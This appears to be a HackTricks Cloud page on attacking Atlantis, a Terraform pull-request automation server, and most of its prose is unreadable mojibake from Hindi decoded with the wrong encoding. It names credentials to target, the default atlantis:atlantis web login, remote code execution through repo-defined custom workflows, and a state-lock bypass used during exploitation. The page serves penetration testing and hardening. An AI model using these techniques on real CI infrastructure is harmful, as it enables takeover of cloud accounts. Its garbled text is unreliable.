# Atlantis Security

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### Basic Information

Atlantis рдореВрд▓ рд░реВрдк рд╕реЗ рдЖрдкрдХреЛ рдЖрдкрдХреЗ git рд╕рд░реНрд╡рд░ рд╕реЗ Pull Requests рд╕реЗ terraform рдЪрд▓рд╛рдиреЗ рдореЗрдВ рдорджрдж рдХрд░рддрд╛ рд╣реИред

![](<../.gitbook/assets/image (161).png>)

### Local Lab

1. [https://github.com/runatlantis/atlantis/releases](https://github.com/runatlantis/atlantis/releases) рдкрд░ **atlantis releases page** рдкрд░ рдЬрд╛рдПрдВ рдФрд░ **download** рдХрд░реЗрдВ рдЬреЛ рдЖрдкрдХреЗ рд▓рд┐рдП рдЙрдкрдпреБрдХреНрдд рд╣реЛред
2. рдЕрдкрдиреЗ **github** рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ **personal token** (repo access рдХреЗ рд╕рд╛рде) рдмрдирд╛рдПрдВред
3. `./atlantis testdrive` рдЪрд▓рд╛рдПрдВ рдФрд░ рдпрд╣ рдПрдХ **demo repo** рдмрдирд╛рдПрдЧрд╛ рдЬрд┐рд╕рдХрд╛ рдЖрдк **atlantis рд╕реЗ рдмрд╛рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред**
1. рдЖрдк 127.0.0.1:4141 рдореЗрдВ рд╡реЗрдм рдкреГрд╖реНрда рддрдХ рдкрд╣реБрдБрдЪ рд╕рдХрддреЗ рд╣реИрдВред

### Atlantis Access

#### Git Server Credentials

**Atlantis** рдХрдИ git рд╣реЛрд╕реНрдЯ рдЬреИрд╕реЗ **Github**, **Gitlab**, **Bitbucket** рдФрд░ **Azure DevOps** рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИред\
рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЗрди рдкреНрд▓реЗрдЯрдлрд╛рд░реНрдореЛрдВ рдореЗрдВ repos рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдФрд░ рдХреНрд░рд┐рдпрд╛рдПрдБ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЗрд╕реЗ рдХреБрдЫ **privileged access granted to them** (рдХрдо рд╕реЗ рдХрдо рд▓рд┐рдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐) рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред\
[**The docs**](https://www.runatlantis.io/docs/access-credentials.html#create-an-atlantis-user-optional) рдЗрди рдкреНрд▓реЗрдЯрдлрд╛рд░реНрдореЛрдВ рдореЗрдВ Atlantis рдХреЗ рд▓рд┐рдП рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдмрдирд╛рдиреЗ рдХреА рд╕рд┐рдлрд╛рд░рд┐рд╢ рдХрд░рддреЗ рд╣реИрдВ, рд▓реЗрдХрд┐рди рдХреБрдЫ рд▓реЛрдЧ рд╡реНрдпрдХреНрддрд┐рдЧрдд рдЦрд╛рддреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

{% hint style="warning" %}
рдХрд┐рд╕реА рднреА рдорд╛рдорд▓реЗ рдореЗрдВ, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рджреГрд╖реНрдЯрд┐рдХреЛрдг рд╕реЗ, **Atlantis account** рдПрдХ рдмрд╣реБрдд рд╣реА **рджрд┐рд▓рдЪрд╕реНрдк** **рдХреЛ рд╕рдордЭреМрддрд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП** рд╣реЛрдЧрд╛ред
{% endhint %}

#### Webhooks

Atlantis рд╡реИрдХрд▓реНрдкрд┐рдХ рд░реВрдк рд╕реЗ [**Webhook secrets**](https://www.runatlantis.io/docs/webhook-secrets.html#generating-a-webhook-secret) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рддрд╛рдХрд┐ рдпрд╣ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ рдХрд┐ **webhooks** рдЬреЛ рдЗрд╕реЗ рдЖрдкрдХреЗ Git рд╣реЛрд╕реНрдЯ рд╕реЗ рдорд┐рд▓рддреЗ рд╣реИрдВ, **legitimate** рд╣реИрдВред

рдЗрд╕рдХреА рдкреБрд╖реНрдЯрд┐ рдХрд░рдиреЗ рдХрд╛ рдПрдХ рддрд░реАрдХрд╛ рдпрд╣ рд╣реЛрдЧрд╛ рдХрд┐ **рдХреЗрд╡рд▓ рдЖрдкрдХреЗ Git рд╣реЛрд╕реНрдЯ рдХреЗ IPs рд╕реЗ рдЖрдиреЗ рдХреЗ рд▓рд┐рдП requests рдХреЛ allowlist рдХрд░реЗрдВ**, рд▓реЗрдХрд┐рди рдПрдХ рдЖрд╕рд╛рди рддрд░реАрдХрд╛ Webhook Secret рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реИред

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЬрдм рддрдХ рдЖрдк рдПрдХ рдирд┐рдЬреА github рдпрд╛ bitbucket рд╕рд░реНрд╡рд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд░рддреЗ, рдЖрдкрдХреЛ webhook endpoints рдХреЛ рдЗрдВрдЯрд░рдиреЗрдЯ рдкрд░ рдЙрдЬрд╛рдЧрд░ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреАред

{% hint style="warning" %}
Atlantis **webhooks** рдХреЛ **exposing** рдХрд░рдиреЗ рдЬрд╛ рд░рд╣рд╛ рд╣реИ рддрд╛рдХрд┐ git рд╕рд░реНрд╡рд░ рдЗрд╕реЗ рдЬрд╛рдирдХрд╛рд░реА рднреЗрдЬ рд╕рдХреЗред рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рджреГрд╖реНрдЯрд┐рдХреЛрдг рд╕реЗ рдпрд╣ рдЬрд╛рдирдирд╛ рджрд┐рд▓рдЪрд╕реНрдк рд╣реЛрдЧрд╛ рдХрд┐ **рдХреНрдпрд╛ рдЖрдк рдЗрд╕реЗ рд╕рдВрджреЗрд╢ рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВ**ред
{% endhint %}

#### Provider Credentials <a href="#provider-credentials" id="provider-credentials"></a>

[From the docs:](https://www.runatlantis.io/docs/provider-credentials.html)

Atlantis Terraform рдХреЛ рдмрд╕ **`terraform plan` рдФрд░ `apply`** рдХрдорд╛рдВрдбреНрд╕ рдХреЛ рд╕рд░реНрд╡рд░ рдкрд░ **Atlantis is hosted on** рдкрд░ рдЪрд▓рд╛рдХрд░ рдЪрд▓рд╛рддрд╛ рд╣реИред рдареАрдХ рдЙрд╕реА рддрд░рд╣ рдЬреИрд╕реЗ рдЖрдк рд╕реНрдерд╛рдиреАрдп рд░реВрдк рд╕реЗ Terraform рдЪрд▓рд╛рддреЗ рд╣реИрдВ, Atlantis рдХреЛ рдЖрдкрдХреЗ рд╡рд┐рд╢реЗрд╖ рдкреНрд░рджрд╛рддрд╛ рдХреЗ рд▓рд┐рдП рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред

рдпрд╣ рдЖрдкрдХреЗ рдКрдкрд░ рд╣реИ рдХрд┐ рдЖрдк Atlantis рдХреЗ рд▓рд┐рдП рдЕрдкрдиреЗ рд╡рд┐рд╢реЗрд╖ рдкреНрд░рджрд╛рддрд╛ рдХреЗ рд▓рд┐рдП [credentials](https://www.runatlantis.io/docs/provider-credentials.html#aws-specific-info) рдХреИрд╕реЗ рдкреНрд░рджрд╛рди рдХрд░рддреЗ рд╣реИрдВ:

* Atlantis [Helm Chart](https://www.runatlantis.io/docs/deployment.html#kubernetes-helm-chart) рдФрд░ [AWS Fargate Module](https://www.runatlantis.io/docs/deployment.html#aws-fargate) рдХреЗ рдкрд╛рд╕ рдкреНрд░рджрд╛рддрд╛ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЗ рд▓рд┐рдП рдЕрдкрдиреЗ рд╕реНрд╡рдпрдВ рдХреЗ рддрдВрддреНрд░ рд╣реИрдВред рдЙрдирдХреЗ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдкрдврд╝реЗрдВред
* рдпрджрд┐ рдЖрдк Atlantis рдХреЛ рдПрдХ рдХреНрд▓рд╛рдЙрдб рдореЗрдВ рдЪрд▓рд╛ рд░рд╣реЗ рд╣реИрдВ рддреЛ рдХрдИ рдХреНрд▓рд╛рдЙрдб рдореЗрдВ рдЙрди рдкрд░ рдЪрд▓рдиреЗ рд╡рд╛рд▓реЗ рдЕрдиреБрдкреНрд░рдпреЛрдЧреЛрдВ рдХреЛ рдХреНрд▓рд╛рдЙрдб API рдПрдХреНрд╕реЗрд╕ рджреЗрдиреЗ рдХреЗ рддрд░реАрдХреЗ рд╣реЛрддреЗ рд╣реИрдВ, рдЬреИрд╕реЗ:
* [AWS EC2 Roles](https://registry.terraform.io/providers/hashicorp/aws/latest/docs) ( "EC2 Role" рдХреЗ рд▓рд┐рдП рдЦреЛрдЬреЗрдВ)
* [GCE Instance Service Accounts](https://registry.terraform.io/providers/hashicorp/google/latest/docs/guides/provider_reference)
* рдХрдИ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкрд░реНрдпрд╛рд╡рд░рдг рдЪрд░ рд╕реЗрдЯ рдХрд░рддреЗ рд╣реИрдВ, рдЬреИрд╕реЗ `AWS_ACCESS_KEY`, рдЬрд╣рд╛рдВ Atlantis рдЪрд▓ рд░рд╣рд╛ рд╣реИред
* рдЕрдиреНрдп рдЖрд╡рд╢реНрдпрдХ рдХреЙрдиреНрдлрд╝рд┐рдЧ рдлрд╝рд╛рдЗрд▓реЗрдВ рдмрдирд╛рддреЗ рд╣реИрдВ, рдЬреИрд╕реЗ `~/.aws/credentials`, рдЬрд╣рд╛рдВ Atlantis рдЪрд▓ рд░рд╣рд╛ рд╣реИред
* рдкреНрд░рджрд╛рддрд╛ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП [HashiCorp Vault Provider](https://registry.terraform.io/providers/hashicorp/vault/latest/docs) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред

{% hint style="warning" %}
**Container** рдЬрд╣рд╛рдВ **Atlantis** **рдЪрд▓ рд░рд╣рд╛ рд╣реИ** рдореЗрдВ рдЙрдЪреНрдЪ рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИ рдХрд┐ **privileged credentials** рдкреНрд░рджрд╛рддрд╛рдУрдВ (AWS, GCP, Github...) рдХреЗ рд▓рд┐рдП рд╣реЛрдВрдЧреЗ рдЬрд┐рдиреНрд╣реЗрдВ Atlantis Terraform рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░ рд░рд╣рд╛ рд╣реИред
{% endhint %}

#### Web Page

рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ Atlantis рдПрдХ **рд╡реЗрдм рдкреГрд╖реНрда рдХреЛ localhost рдореЗрдВ рдкреЛрд░реНрдЯ 4141 рдкрд░ рдЪрд▓рд╛рдПрдЧрд╛ред** рдпрд╣ рдкреГрд╖реНрда рдЖрдкрдХреЛ atlantis apply рдХреЛ рд╕рдХреНрд╖рдо/рдЕрдХреНрд╖рдо рдХрд░рдиреЗ рдФрд░ repos рдХреА рдпреЛрдЬрдирд╛ рдХреА рд╕реНрдерд┐рддрд┐ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдФрд░ рдЙрдиреНрд╣реЗрдВ рдЕрдирд▓реЙрдХ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ (рдпрд╣ рдЪреАрдЬреЛрдВ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рджреЗрддрд╛, рдЗрд╕рд▓рд┐рдП рдпрд╣ рдЗрддрдирд╛ рдЙрдкрдпреЛрдЧреА рдирд╣реАрдВ рд╣реИ)ред

рдЖрдк рд╢рд╛рдпрдж рдЗрд╕реЗ рдЗрдВрдЯрд░рдиреЗрдЯ рдкрд░ рдЙрдЬрд╛рдЧрд░ рдирд╣реАрдВ рдкрд╛рдПрдВрдЧреЗ, рд▓реЗрдХрд┐рди рдРрд╕рд╛ рд▓рдЧрддрд╛ рд╣реИ рдХрд┐ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ **рдЗрд╕ рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдХреЛрдИ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИ** (рдФрд░ рдпрджрд┐ рд╣реИрдВ рддреЛ `atlantis`:`atlantis` **рдбрд┐рдлрд╝реЙрд▓реНрдЯ** рд╣реИрдВ)ред

### Server Configuration

`atlantis server` рдХреЗ рд▓рд┐рдП рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХрдорд╛рдВрдб рд▓рд╛рдЗрди рдлреНрд▓реИрдЧ, рдкрд░реНрдпрд╛рд╡рд░рдг рдЪрд░, рдПрдХ рдХреЙрдиреНрдлрд╝рд┐рдЧ рдлрд╝рд╛рдЗрд▓ рдпрд╛ рддреАрдиреЛрдВ рдХрд╛ рдорд┐рд╢реНрд░рдг рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

* рдЖрдк [**рдпрд╣рд╛рдВ рдлреНрд▓реИрдЧ рдХреА рд╕реВрдЪреА**](https://www.runatlantis.io/docs/server-configuration.html#server-configuration) рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ Atlantis рд╕рд░реНрд╡рд░ рджреНрд╡рд╛рд░рд╛ рд╕рдорд░реНрдерд┐рдд рд╣реИрдВред
* рдЖрдк [**рдпрд╣рд╛рдВ рдЬрд╛рди рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдПрдХ рдХреЙрдиреНрдлрд╝рд┐рдЧ рд╡рд┐рдХрд▓реНрдк рдХреЛ env var рдореЗрдВ рдХреИрд╕реЗ рдкрд░рд┐рд╡рд░реНрддрд┐рдд рдХрд░реЗрдВ**](https://www.runatlantis.io/docs/server-configuration.html#environment-variables)

рдорд╛рди рдорд╛рдирдиреЗ рдХреЗ рд▓рд┐рдП **рдЗрд╕ рдХреНрд░рдо рдореЗрдВ рдЪреБрдиреЗ рдЬрд╛рддреЗ рд╣реИрдВ**:

1. Flags
2. Environment Variables
3. Config File

{% hint style="warning" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдореЗрдВ рдЖрдк **tokens рдФрд░ passwords** рдЬреИрд╕реЗ рджрд┐рд▓рдЪрд╕реНрдк рдорд╛рди рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред
{% endhint %}

#### Repos Configuration

рдХреБрдЫ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди **repos рдХреЗ рдкреНрд░рдмрдВрдзрди рдХреЗ рддрд░реАрдХреЗ рдХреЛ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░рддреЗ рд╣реИрдВред** рд╣рд╛рд▓рд╛рдБрдХрд┐, рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ **рдкреНрд░рддреНрдпреЗрдХ repo рдХреЛ рд╡рд┐рднрд┐рдиреНрди рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛ**, рдЗрд╕рд▓рд┐рдП рдкреНрд░рддреНрдпреЗрдХ repo рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдиреЗ рдХреЗ рддрд░реАрдХреЗ рд╣реИрдВред рдпрд╣ рдкреНрд░рд╛рдердорд┐рдХрддрд╛ рдХреНрд░рдо рд╣реИ:

1. Repo [**`/atlantis.yml`**](https://www.runatlantis.io/docs/repo-level-atlantis-yaml.html#repo-level-atlantis-yaml-config) рдлрд╝рд╛рдЗрд▓ред рдЗрд╕ рдлрд╝рд╛рдЗрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдпрд╣ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ atlantis рдХреЛ repo рдХреЗ рд╕рд╛рде рдХреИрд╕реЗ рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдПред рд╣рд╛рд▓рд╛рдБрдХрд┐, рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдХреБрдЫ рдХреБрдВрдЬрд┐рдпрд╛рдБ рдпрд╣рд╛рдБ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдирд╣реАрдВ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВ рдмрд┐рдирд╛ рдХреБрдЫ рдлреНрд▓реИрдЧреНрд╕ рдХреА рдЕрдиреБрдорддрд┐ рдХреЗред
1. рд╢рд╛рдпрдж `allowed_overrides` рдпрд╛ `allow_custom_workflows` рдЬреИрд╕реЗ рдлреНрд▓реИрдЧреНрд╕ рджреНрд╡рд╛рд░рд╛ рдЕрдиреБрдорддрд┐ рджреА рдЬрд╛рдиреА рдЪрд╛рд╣рд┐рдПред
2. [**Server Side Config**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config): рдЖрдк рдЗрд╕реЗ рдлреНрд▓реИрдЧ `--repo-config` рдХреЗ рд╕рд╛рде рдкрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдпрд╣ рдкреНрд░рддреНрдпреЗрдХ repo рдХреЗ рд▓рд┐рдП рдирдИ рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдХреЛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рдиреЗ рд╡рд╛рд▓рд╛ yaml рд╣реИ (regexes рд╕рдорд░реНрдерд┐рдд)ред
3. **Default** рдорд╛рди

**PR Protections**

Atlantis рдпрд╣ рд╕рдВрдХреЗрдд рджреЗрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдХрд┐ рдХреНрдпрд╛ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ **PR** рдХреЛ рдХрд┐рд╕реА рдФрд░ рджреНрд╡рд╛рд░рд╛ **`approved`** рдХрд┐рдпрд╛ рдЬрд╛рдП (рдпрд╣рд╛рдВ рддрдХ рдХрд┐ рдпрджрд┐ рд╡рд╣ рд╢рд╛рдЦрд╛ рд╕реБрд░рдХреНрд╖рд╛ рдореЗрдВ рд╕реЗрдЯ рдирд╣реАрдВ рд╣реИ) рдФрд░/рдпрд╛ **`mergeable`** (рд╢рд╛рдЦрд╛ рд╕реБрд░рдХреНрд╖рд╛ рдкрд╛рд╕ рдХреА рдЧрдИ) **apply рдЪрд▓рд╛рдиреЗ рд╕реЗ рдкрд╣рд▓реЗред** рд╕реБрд░рдХреНрд╖рд╛ рдХреЗ рджреГрд╖реНрдЯрд┐рдХреЛрдг рд╕реЗ, рджреЛрдиреЛрдВ рд╡рд┐рдХрд▓реНрдк рд╕реЗрдЯ рдХрд░рдирд╛ рдЕрдиреБрд╢рдВрд╕рд┐рдд рд╣реИред

рдпрджрд┐ `allowed_overrides` True рд╣реИ, рддреЛ рдпреЗ рд╕реЗрдЯрд┐рдВрдЧреНрд╕ **рдкреНрд░рддреНрдпреЗрдХ рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдкрд░ `/atlantis.yml` рдлрд╝рд╛рдЗрд▓ рджреНрд╡рд╛рд░рд╛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВред**

**Scripts**

Repo config **scripts** рдХреЛ рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП [**before**](https://www.runatlantis.io/docs/pre-workflow-hooks.html#usage) (_pre workflow hooks_) рдФрд░ [**after**](https://www.runatlantis.io/docs/post-workflow-hooks.html) (_post workflow hooks_) рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬрдм рдПрдХ **workflow рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрддреА рд╣реИред**

рдЗрди рд╕реНрдХреНрд░рд┐рдкреНрдЯреЛрдВ рдХреЛ **repo `/atlantis.yml`** рдлрд╝рд╛рдЗрд▓ рдореЗрдВ **specify** рдХрд░рдиреЗ рдХреА рдХреЛрдИ рд╡рд┐рдХрд▓реНрдк рдирд╣реАрдВ рд╣реИред

**Workflow**

Repo config (server side config) рдореЗрдВ рдЖрдк [**рдПрдХ рдирдпрд╛ рдбрд┐рдлрд╝реЙрд▓реНрдЯ workflow**](https://www.runatlantis.io/docs/server-side-repo-config.html#change-the-default-atlantis-workflow) рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдпрд╛ [**рдирдИ рдХрд╕реНрдЯрдо workflows**](https://www.runatlantis.io/docs/custom-workflows.html#custom-workflows)** рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВред** рдЖрдк рдпрд╣ рднреА **specify** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдХреМрди рд╕реЗ **repos** **рдирдП** рдЙрддреНрдкрдиреНрди рдХрд┐рдП рдЧрдП ones рддрдХ **access** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
рдлрд┐рд░, рдЖрдк рдкреНрд░рддреНрдпреЗрдХ repo рдХреЗ **atlantis.yaml** рдлрд╝рд╛рдЗрд▓ рдХреЛ **workflow рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП specify** рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗ рд╕рдХрддреЗ рд╣реИрдВред

{% hint style="danger" %}
рдпрджрд┐ [**server side config**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) рдлреНрд▓реИрдЧ `allow_custom_workflows` рдХреЛ **True** рдкрд░ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ workflows рдХреЛ рдкреНрд░рддреНрдпреЗрдХ repo рдХреЗ **`atlantis.yaml`** рдлрд╝рд╛рдЗрд▓ рдореЗрдВ **specify** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рднреА рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рдЖрд╡рд╢реНрдпрдХ рд╣реИ рдХрд┐ **`allowed_overrides`** **`workflow`** рдХреЛ **override рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП specify** рдХрд░реЗ рдЬреЛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдиреЗ рд╡рд╛рд▓рд╛ рд╣реИред\
рдпрд╣ рдореВрд▓ рд░реВрдк рд╕реЗ **Atlantis рд╕рд░реНрд╡рд░ рдореЗрдВ RCE рдХрд┐рд╕реА рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рджреЗрдЧрд╛ рдЬреЛ рдЙрд╕ repo рддрдХ рдкрд╣реБрдБрдЪ рд╕рдХрддрд╛ рд╣реИред**
```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
workflow: custom1
workflows:
custom1:
plan:
steps:
- init
- run: my custom plan command
apply:
steps:
- run: my custom apply command
```
{% endhint %}

**Conftest рдиреАрддрд┐ рдЬрд╛рдВрдЪрдирд╛**

Atlantis **рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб** [**conftest**](https://www.conftest.dev/) **рдиреАрддрд┐рдпреЛрдВ** рдХреЛ рдпреЛрдЬрдирд╛ рдЖрдЙрдЯрдкреБрдЯ рдХреЗ рдЦрд┐рд▓рд╛рдл рдЪрд▓рд╛рдиреЗ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИред рдЗрд╕ рдЪрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд╕рд╛рдорд╛рдиреНрдп рдорд╛рдорд▓реЗ рд╢рд╛рдорд┐рд▓ рд╣реИрдВ:

* рдореЙрдбреНрдпреВрд▓ рдХреА рдПрдХ рд╕реВрдЪреА рдХреЗ рдЙрдкрдпреЛрдЧ рдХреЛ рдЕрд╕реНрд╡реАрдХрд╛рд░ рдХрд░рдирд╛
* рдирд┐рд░реНрдорд╛рдг рдХреЗ рд╕рдордп рдПрдХ рд╕рдВрд╕рд╛рдзрди рдХреЗ рдЧреБрдгреЛрдВ рдХрд╛ рд╕рддреНрдпрд╛рдкрди рдХрд░рдирд╛
* рдЕрдирдЬрд╛рдиреЗ рдореЗрдВ рд╕рдВрд╕рд╛рдзрди рд╣рдЯрд╛рдиреЗ рдХреЛ рдкрдХрдбрд╝рдирд╛
* рд╕реБрд░рдХреНрд╖рд╛ рдЬреЛрдЦрд┐рдореЛрдВ рдХреЛ рд░реЛрдХрдирд╛ (рдЬреИрд╕реЗ, рд╕реБрд░рдХреНрд╖рд┐рдд рдкреЛрд░реНрдЯ рдХреЛ рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рд░реВрдк рд╕реЗ рдЙрдЬрд╛рдЧрд░ рдХрд░рдирд╛)

рдЖрдк рдЗрд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рдиреЗ рдХреЗ рддрд░реАрдХреЗ рдХреА рдЬрд╛рдВрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ [**рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдореЗрдВ**](https://www.runatlantis.io/docs/policy-checking.html#how-it-works).

### Atlantis рдХрдорд╛рдВрдб

[**рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдореЗрдВ**](https://www.runatlantis.io/docs/using-atlantis.html#using-atlantis) рдЖрдк рдЙрди рд╡рд┐рдХрд▓реНрдкреЛрдВ рдХреЛ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рдирдХрд╛ рдЙрдкрдпреЛрдЧ рдЖрдк Atlantis рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
# Get help
atlantis help

# Run terraform plan
atlantis plan [options] -- [terraform plan flags]
##Options:
## -d directory
## -p project
## --verbose
## You can also add extra terraform options

# Run terraform apply
atlantis apply [options] -- [terraform apply flags]
##Options:
## -d directory
## -p project
## -w workspace
## --auto-merge-disabled
## --verbose
## You can also add extra terraform options
```
### рд╣рдорд▓реЗ

{% hint style="warning" %}
рдпрджрд┐ рд╢реЛрд╖рдг рдХреЗ рджреМрд░рд╛рди рдЖрдкрдХреЛ рдпрд╣ **рддреНрд░реБрдЯрд┐** рдорд┐рд▓рддреА рд╣реИ: `Error: Error acquiring the state lock`

рдЖрдк рдЗрд╕реЗ рдЪрд▓рд╛рдХрд░ рдареАрдХ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```
atlantis unlock #You might need to run this in a different PR
atlantis plan -- -lock=false
```
{% endhint %}

